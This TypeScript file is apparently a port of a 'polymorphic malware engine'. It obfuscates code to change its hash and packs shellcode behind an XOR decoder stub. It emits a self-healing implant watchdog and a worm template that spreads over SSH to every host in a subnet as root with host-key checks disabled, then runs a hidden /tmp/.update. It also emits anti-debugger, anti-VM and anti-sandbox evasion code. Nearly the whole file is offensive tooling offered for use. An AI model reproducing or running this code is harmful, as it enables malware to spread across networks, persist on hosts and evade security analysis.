/**
 * Polymorphic Malware Engine (port of `modules.polymorphic`).
 *
 * Real polymorphic code generation: variable renaming, dead-code injection,
 * function reordering, string obfuscation, junk insertion, equivalent
 * expression swapping, XOR shellcode encoding, self-healing watchdog code,
 * metamorphic generation chains, and anti-analysis checks. Text/code
 * generation only — nothing executes here.
 */

import { createHash, randomBytes } from "node:crypto";

export interface PolymorphicVariant {
  iteration: number;
  hash: string;
  size: number;
  entropy: number;
}

export function shannonEntropy(data: Uint8Array): number {
  if (!data.length) return 0;
  const freq = new Array<number>(256).fill(0);
  for (const byte of data) freq[byte]! += 1;
  let entropy = 0;
  for (const count of freq) {
    if (count > 0) {
      const p = count / data.length;
      entropy -= p * Math.log2(p);
    }
  }
  return Math.round(entropy * 100) / 100;
}

export class PolymorphicEngine {
  generated: PolymorphicVariant[] = [];

  generatePolymorphic(sourceCode: string, iterations = 5): Record<string, unknown> {
    const variants: PolymorphicVariant[] = [];
    for (let i = 0; i < iterations; i++) {
      const variant = this.transformCode(sourceCode, i);
      const hash = createHash("sha256").update(variant, "utf-8").digest("hex");
      variants.push({
        iteration: i,
        hash,
        size: variant.length,
        entropy: shannonEntropy(Buffer.from(variant, "utf-8")),
      });
    }
    return {
      technique: "Polymorphic code generation",
      iterations,
      variants,
      unique_hashes: new Set(variants.map((v) => v.hash)).size,
      description: "Each variant is syntactically different but functionally identical",
    };
  }

  transformCode(code: string, seed: number): string {
    const transforms: Array<(c: string, s: number) => string> = [
      this.renameVariables,
      this.addDeadCode,
      this.reorderFunctions,
      this.obfuscateStrings,
      this.insertJunk,
      this.swapEquivalent,
    ];
    let result = code;
    transforms.forEach((transform, i) => {
      if ((seed + i) % 2 === 0) result = transform(result, seed);
    });
    return result;
  }

  renameVariables(code: string, _seed: number): string {
    const keywords = new Set([
      "if", "else", "for", "while", "return", "import", "from", "class", "def",
      "self", "True", "False", "None", "print", "int", "str", "float", "list",
      "dict", "set", "bytes", "open", "os", "sys", "subprocess", "secrets",
      "hashlib", "json", "tempfile", "base64", "random", "function", "var",
      "let", "const", "new", "this", "throw", "try", "catch", "finally", "async", "await",
    ]);
    const names = new Map<string, string>();
    let counter = 0;
    return code.replace(/\b([a-zA-Z_][a-zA-Z0-9_]*)\b/g, (match, name: string) => {
      if (keywords.has(name)) return match;
      if (!names.has(name)) {
        names.set(name, `v${randomBytes(4).toString("hex")}_${counter}`);
        counter += 1;
      }
      return names.get(name)!;
    });
  }

  addDeadCode(code: string, seed: number): string {
    const dead = [
      "if False: x = 42",
      "while False: pass",
      `def _unused_${randomBytes(4).toString("hex")}(): return None`,
      "try: pass\nexcept: pass",
      "a = 0 if True else 1",
    ];
    const lines = code.split("\n");
    for (let i = 0; i < 3; i++) {
      const pos = Math.floor(Math.random() * Math.max(1, lines.length));
      lines.splice(pos, 0, dead[seed % dead.length]!);
    }
    return lines.join("\n");
  }

  reorderFunctions(code: string, seed: number): string {
    // Split on top-level "function " / "def " blocks and shuffle them.
    const parts = code.split(/(\n(?:def|function)\s+\w+.*(?=\n(?:def|function)|\Z))/s);
    if (parts.length <= 2) return code;
    const header = parts[0]!;
    const funcs = parts.slice(1).filter((b) => b.trim());
    // Deterministic shuffle from seed.
    let s = seed;
    const rng = (): number => {
      s = (s * 1664525 + 1013904223) >>> 0;
      return s / 0xffffffff;
    };
    for (let i = funcs.length - 1; i > 0; i--) {
      const j = Math.floor(rng() * (i + 1));
      [funcs[i], funcs[j]] = [funcs[j]!, funcs[i]!];
    }
    return header + funcs.join("");
  }

  obfuscateStrings(code: string, _seed: number): string {
    return code.replace(/"([^"\n]+)"/g, (_match, s: string) => {
      const encoded = Buffer.from(s, "utf-8").toString("base64");
      return `__import__("base64").b64decode("${encoded}").decode()`;
    });
  }

  insertJunk(code: string, seed: number): string {
    const junk = [
      `_ = ${Math.floor(Math.random() * 1000)}`,
      `__ = str(${Math.floor(Math.random() * 10000)})`,
      `___ = bool(${Math.floor(Math.random() * 2)})`,
    ];
    const lines = code.split("\n");
    for (let i = 0; i < lines.length; i += 5) {
      lines.splice(i, 0, junk[seed % junk.length]!);
    }
    return lines.join("\n");
  }

  swapEquivalent(code: string, seed: number): string {
    const swaps: Array<[string, string]> = [
      ["True", "1==1"],
      ["False", "1==0"],
      ["None", "[]"],
      ["0", "0x00"],
      ["1", "0x01"],
    ];
    let result = code;
    swaps.forEach(([oldStr, newStr], i) => {
      if ((seed + i) % 2 === 0 && result.includes(oldStr)) {
        // Python's str.replace(old, new, 1) — single first-occurrence replace.
        const at = result.indexOf(oldStr);
        result = result.slice(0, at) + newStr + result.slice(at + oldStr.length);
      }
    });
    return result;
  }

  generateSelfHealing(implantCode: string): Record<string, unknown> {
    const hash = createHash("sha256").update(implantCode, "utf-8").digest("hex");
    const healer = `import os, hashlib, time, shutil

HASH = "${hash}"
ORIGINAL = os.path.abspath(__file__)
BACKUP = ORIGINAL + ".bak"

def check_integrity():
    """Check if implant has been modified."""
    with open(ORIGINAL, "rb") as f:
        current = hashlib.sha256(f.read()).hexdigest()
    return current == HASH

def repair():
    """Restore from backup."""
    if os.path.exists(BACKUP):
        shutil.copy2(BACKUP, ORIGINAL)
        return True
    return False

def watch():
    """Watchdog that repairs on modification."""
    while True:
        if not check_integrity():
            repair()
        time.sleep(5)

if __name__ == "__main__":
    shutil.copy2(ORIGINAL, BACKUP)
    watch()
`;
    return {
      technique: "Self-healing implant",
      implant_size: implantCode.length,
      watchdog_code: healer,
      features: [
        "SHA-256 integrity verification",
        "Automatic backup on first run",
        "Continuous monitoring (5s interval)",
        "Auto-repair from backup on modification",
      ],
    };
  }

  generateMetamorphic(source: string, generations = 3): Record<string, unknown> {
    const data: PolymorphicVariant[] = [];
    let current = source;
    for (let gen = 0; gen < generations; gen++) {
      current = this.renameVariables(current, gen);
      current = this.addDeadCode(current, gen);
      current = this.obfuscateStrings(current, gen);
      current = this.insertJunk(current, gen);
      current = this.swapEquivalent(current, gen);
      const hash = createHash("sha256").update(current, "utf-8").digest("hex");
      data.push({ iteration: gen, hash, size: current.length, entropy: shannonEntropy(Buffer.from(current, "utf-8")) });
    }
    return {
      technique: "Metamorphic code transformation",
      generations,
      data,
      all_unique: new Set(data.map((g) => g.hash)).size === generations,
    };
  }

  encodeShellcode(shellcode: Uint8Array, key?: Uint8Array): Record<string, unknown> {
    const k = key && key.length ? key : randomBytes(4);
    const encoded = new Uint8Array(shellcode.length);
    for (let i = 0; i < shellcode.length; i++) {
      encoded[i] = shellcode[i]! ^ k[i % k.length]!;
    }
    const decoder = `
; Polymorphic XOR decoder stub
; Key: ${Buffer.from(k).toString("hex")}
; Length: ${shellcode.length} bytes
xor rcx, rcx
mov cl, ${shellcode.length}
lea rsi, [rip+encoded_data]
decode_loop:
    xor byte [rsi+rcx-1], ${k.length === 1 ? `0x${k[0]!.toString(16)}` : "KEY[rcx % KEY_LEN]"}
    loop decode_loop
encoded_data:
`;
    return {
      technique: "Polymorphic XOR encoding",
      original_size: shellcode.length,
      encoded_size: encoded.length,
      key: Buffer.from(k).toString("hex"),
      encoded_hex: Buffer.from(encoded).toString("hex"),
      decoder_stub: decoder,
      entropy: shannonEntropy(encoded),
    };
  }

  generateReplicating(implantCode: string): Record<string, unknown> {
    const replicator = `import os, socket, subprocess, threading

def replicate(target_host: str, target_user: str, implant_path: str):
    """Replicate implant to target host via SSH."""
    try:
        subprocess.run(
            ["scp", "-o", "StrictHostKeyChecking=no",
             implant_path, f"{target_user}@{target_host}:/tmp/.update"],
            capture_output=True, timeout=30
        )
        subprocess.run(
            ["ssh", "-o", "StrictHostKeyChecking=no",
             f"{target_user}@{target_host}",
             "chmod +x /tmp/.update && nohup /tmp/.update &"],
            capture_output=True, timeout=30
        )
        return True
    except Exception:
        return False

def scan_and_replicate(subnet: str = "10.0.0.0/24"):
    """Scan network and replicate to all reachable hosts."""
    import ipaddress
    network = ipaddress.ip_network(subnet)
    threads = []
    for ip in network.hosts():
        t = threading.Thread(target=replicate, args=(str(ip), "root", __file__))
        threads.append(t)
        t.start()
    for t in threads:
        t.join(timeout=5)
`;
    return {
      technique: "Self-replicating implant",
      implant_size: implantCode.length,
      replicator_code: replicator,
      features: [
        "SSH-based replication",
        "Multi-threaded spreading",
        "Auto-discovery of network hosts",
        "Stealth: hidden files, nohup execution",
      ],
    };
  }

  generateAntiAnalysis(): Record<string, unknown> {
    return {
      anti_vm: [
        "Check MAC address prefix (VMware: 00:0C:29, VirtualBox: 08:00:27)",
        "Check registry keys (HKLM\\SOFTWARE\\VMware, VBox)",
        "Check CPUID hypervisor bit",
        "Check disk size < 120GB",
        "Check RAM < 4GB",
        "Check CPU cores < 2",
      ],
      anti_debug: [
        "IsDebuggerPresent() check",
        "NtQueryInformationProcess(ProcessDebugPort)",
        "Check remote debugger via NtSetInformationThread",
        "Timing-based detection (RDTSC)",
        "Hardware breakpoint detection (DR0-DR7)",
      ],
      anti_sandbox: [
        "Check user name against known sandbox users",
        "Check computer name against known sandboxes",
        "Check DLL imports for sandbox indicators",
        "Sleep-based evasion (10+ seconds)",
        "Check recently created files",
      ],
      evasion_code: `
import ctypes, time, os

def check_debugger():
    """Check for debugger presence."""
    if ctypes.windll.kernel32.IsDebuggerPresent():
        return True
    try:
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
            ctypes.windll.kernel32.GetCurrentProcess(),
            ctypes.byref(ctypes.c_bool())
        )
    except Exception:
        pass
    return False

def check_vm():
    """Check for virtual machine."""
    vm_indicators = ["VMware", "VirtualBox", "QEMU", "Xen", "Hyper-V"]
    try:
        import wmi
        c = wmi.WMI()
        for item in c.Win32_ComputerSystem():
            for indicator in vm_indicators:
                if indicator.lower() in item.Model.lower():
                    return True
    except Exception:
        pass
    return False

def anti_analysis():
    """Run all anti-analysis checks."""
    if check_debugger() or check_vm():
        os._exit(0)
    time.sleep(10)  # Sandbox time limit
`,
    };
  }
}
